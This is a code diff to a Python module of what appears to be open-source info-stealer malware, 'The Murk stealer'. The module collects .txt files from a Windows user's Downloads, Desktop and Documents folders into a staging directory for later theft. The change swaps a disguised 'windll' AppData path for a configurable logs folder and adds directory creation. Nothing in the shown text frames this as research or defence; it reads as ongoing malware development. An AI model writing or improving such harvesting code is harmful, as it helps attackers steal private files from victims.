@@ -10,10 +10,11 @@
 #             https://github.com/Nick-Vinesmoke/The-Murk-stealer              #
 #-----------------------------------------------------------------------------#
 
-from os import environ, walk
+from os import environ, walk, makedirs
 from os.path import join
 from shutil import copy2
 from manager.logger import Log
+from preferences.config import config
 
 def copy_txt_files(source_folder, destination_folder):
 	try:
@@ -28,14 +29,21 @@ def copy_txt_files(source_folder, destination_folder):
 
 def TxtFiles():
 	Log("===========TxtFiles===========")
-	path = environ['USERPROFILE']
+	user = environ['USERPROFILE']
+	destination_folder = f'{user}\\{config.pathToLogs}\\Files'
+	downloads = fr"{user}/Downloads"
+	desktop = fr"{user}/Desktop"
+	documents = fr"{user}/Documents"
 
-	destination_folder = fr"{path}/AppData/Local/windll/Files/"
-	downloads = fr"{path}/Downloads"
-	desktop = fr"{path}/Desktop"
-	documents = fr"{path}/Documents"
+	try:
+		makedirs(f'{destination_folder}\\Desktop')
+		makedirs(f'{destination_folder}\\Downloads')
+		makedirs(f'{destination_folder}\\Documents')
+	except Exception as error:
+		Log(error)
 
-	copy_txt_files(downloads, destination_folder+"Downloads")
-	copy_txt_files(desktop, destination_folder+"Desktop")
-	copy_txt_files(documents, destination_folder+"Documents")
+	copy_txt_files(downloads, destination_folder+"\\Downloads")
+	copy_txt_files(desktop, destination_folder+"\\Desktop")
+	copy_txt_files(documents, destination_folder+"\\Documents")
+
 
